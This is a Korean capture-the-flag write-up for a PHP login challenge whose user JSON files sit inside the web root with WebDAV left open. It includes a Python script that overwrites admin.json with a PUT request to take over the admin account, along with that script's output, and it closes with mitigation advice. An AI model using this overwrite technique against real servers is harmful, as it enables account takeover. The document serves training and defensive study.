
<!-- markdownlint-disable MD010 MD025 MD029 MD033 -->

# Really Not SQL

## 목차

1. [Intro](#1-intro)
2. [Code](#2-code)
    1. [login.php](#21-loginphp)
    1. [flag.php](#22-flagphp)
3. [Vuln](#3-vuln)
4. [Payload](#4-payload)
5. [참고](#참고)

---

## 1. Intro

해당 문제는 Apache와 PHP로 구성된 간단한 로그인 애플리케이션이다.

사용자 정보는 데이터베이스가 아닌 JSON 파일에 저장되어 있으며, 관리자 계정으로 로그인하면 `/flag.php`에서 플래그를 확인할 수 있다.

파일 구조

```text
/
├── .htaccess
├── 000-default.conf
├── flag
├── run.sh
└── src/
    ├── edit_profile.php
    ├── flag.php
    ├── index.php
    ├── login.php
    ├── static/
    │   ├── index.php
    │   └── style.css
    └── user/
        ├── admin.json
        ├── guest.json
        └── index.php
```

`admin.json` 구조

```json
{
  "no": 0,
  "id": "admin",
  "password": "SHA-256 해시값"
}
```

로그인 시 입력한 비밀번호를 SHA-256으로 해시한 뒤, JSON 파일의 `password` 값과 비교한다.

## 2. Code

### 2.1. login.php

<details>
<summary>전체 코드 접기/펼치기</summary>
<div markdown="1">

```php
<?php
session_start();

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $userDir = __DIR__ . '/user/';
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    $filename = $username . '.json';
    $filepath = $userDir . $filename;

    if ($username !== "admin" && $username !== "guest") {
        $error = "User not found";
    } else {
        $userData = json_decode(file_get_contents($filepath), true);
        if ($userData['id'] !== $username){
            $error = "Error occured";
        } else if ($userData['password'] !== hash("sha256", $password)) {
            $error = "Invalid password";
        } else {
            $_SESSION['user'] = $username;
            $success = true;
        }
    }
    
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Login</title>
    <link rel="stylesheet" href="/static/style.css">
</head>
<body>
<div class="container">
    <h1>Login</h1>
    <form method="post" action="login.php">
        <label for="username">User ID</label>
        <input type="text" id="username" name="username" required>

        <label for="password">Password</label>
        <input type="password" id="password" name="password" required>

        <button type="submit">Login</button>
    </form>
</div>

<?php if ($error): ?>
<script>
    alert("<?= $error ?>");
</script>
<?php elseif ($success): ?>
<script>
    alert("Hello <?= $username ?>");
    window.location.href = "/";
</script>
<?php endif; ?>

</body>
</html>
```

</div>
</details>

로그인 로직은 대략 다음과 같다.

```php
$userData = json_decode(file_get_contents($filepath), true);

if ($userData['password'] !== hash("sha256", $password)) {
    // 로그인 실패
}

$_SESSION['user'] = $username;
```

관리자 계정의 비밀번호 해시를 알고 있거나 변경할 수 있다면 정상적인 로그인 절차를 통해 관리자 세션을 얻을 수 있다.

### 2.2. flag.php

`flag.php`에서는 세션의 사용자 이름이 `admin`인지 검사한다.

```php
<?php 
session_start();

if ($_SESSION['user'] !== "admin") {
    http_response_code(403);
} else {
    $file = file_get_contents('/flag');
    echo trim($file); 
}

?>
```

따라서 최종 목표는 관리자 계정으로 로그인해 세션에 다음 값이 저장되도록 만드는 것이다.

```php
$_SESSION['user'] = "admin";
```

---

## 3. Vuln

### 인증 정보가 웹 루트 내부에 저장됨

```text
/var/www/html/user/admin.json
```

인증 데이터는 웹 서버가 직접 제공하는 경로에 존재해서는 안 된다.

### 사용자 디렉터리에 WebDAV가 활성화됨

```apache
DAV On
```

WebDAV는 HTTP를 통해 파일 생성과 수정을 허용한다.

### 외부 사용자의 접근을 모두 허용함

```apache
Require all granted
```

WebDAV 요청에 별도의 인증이 적용되지 않았다.

### PUT 메서드가 차단되지 않음

```apache
<Limit DELETE>
    Require all denied
</Limit>
```

`DELETE`만 차단했기 때문에 `PUT`을 이용한 파일 덮어쓰기는 가능했다.

### 파일 시스템 쓰기 권한이 과도함

```dockerfile
chmod 777 /var/www/html/user/
chmod 666 /var/www/html/user/*.json
```

Apache 프로세스가 JSON 파일을 수정할 수 있는 환경이 만들어졌다.

---

즉, 외부 사용자가 다음 요청으로 기존 파일을 덮어쓸 수 있다.

```text
PUT /user/admin.json
```

`admin.json`의 비밀번호 해시를 공격자가 정한 비밀번호의 해시로 변경하면, 해당 비밀번호를 이용해 관리자 계정으로 정상 로그인할 수 있다.

## 4. Payload

전체 공격 과정

```text
1. 공격자가 사용할 새 관리자 비밀번호 결정
2. 새 비밀번호의 SHA-256 해시 계산
3. 변경된 해시가 포함된 admin.json 생성
4. WebDAV PUT 요청으로 admin.json 덮어쓰기
5. 새 비밀번호로 관리자 로그인
6. 관리자 세션으로 flag.php 접근
```

### 4.1. admin.json 덮어쓰기

<details>
<summary>전체 코드 접기/펼치기</summary>
<div markdown="1">

```python
import hashlib
import json

import requests

base_url = "http://host3.dreamhack.games:19889"
new_password = "admin1234"

password_hash = hashlib.sha256(
    new_password.encode("utf-8")
).hexdigest()

payload = {
    "no": 0,
    "id": "admin",
    "password": password_hash,
}

response = requests.put(
    f"{base_url}/user/admin.json",
    data=json.dumps(payload).encode("utf-8"),
    headers={"Content-Type": "application/json"},
    timeout=10,
    allow_redirects=False,
)

print(response.status_code, response.reason)
print(response.text)
response.raise_for_status()

response = requests.get(
    f"{base_url}/user/admin.json",
    timeout=10,
)

print(response.status_code)
print(response.text)
```

```text
204 No Content

200
{"no": 0, "id": "admin", "password": "ac9689e2272427085e35b9d3e3e8bed88cb3434828b43b86fc0596cad4c6e270"}
```

</div>
</details>

### 4.2. flag.php 접근

pass

## 12. 대응 방안

### WebDAV 비활성화

WebDAV가 필요하지 않다면 완전히 제거해야 한다.

```apache
<Directory /var/www/html/user/>
    DAV Off
    Options -Indexes
    AllowOverride None
    Require all denied
</Directory>
```

### 사용자 데이터 웹 루트 밖으로 이동

사용자 인증 파일은 다음과 같이 웹 루트 외부에 저장해야 한다.

```text
/var/lib/myapp/users/admin.json
```

PHP 코드에서 해당 경로를 직접 읽도록 구성한다.

```php
$filepath = "/var/lib/myapp/users/" . $username . ".json";
```

### 안전한 비밀번호 해시 사용

단순 SHA-256 대신 PHP의 비밀번호 전용 함수를 사용해야 한다.

```php
$hash = password_hash(
    $password,
    PASSWORD_DEFAULT
);
```

로그인 검증은 다음과 같이 수행한다.

```php
if (
    password_verify(
        $password,
        $userData['password']
    )
) {
    // 로그인 성공
}
```

### 최소 권한 적용

```dockerfile
RUN chown -R www-data:www-data /var/lib/myapp/users \
    && chmod 750 /var/lib/myapp/users \
    && chmod 640 /var/lib/myapp/users/*.json
```

### 세션 보안 강화

로그인 성공 시 세션 ID를 재생성해야 한다.

```php
session_regenerate_id(true);
$_SESSION['user'] = $username;
```
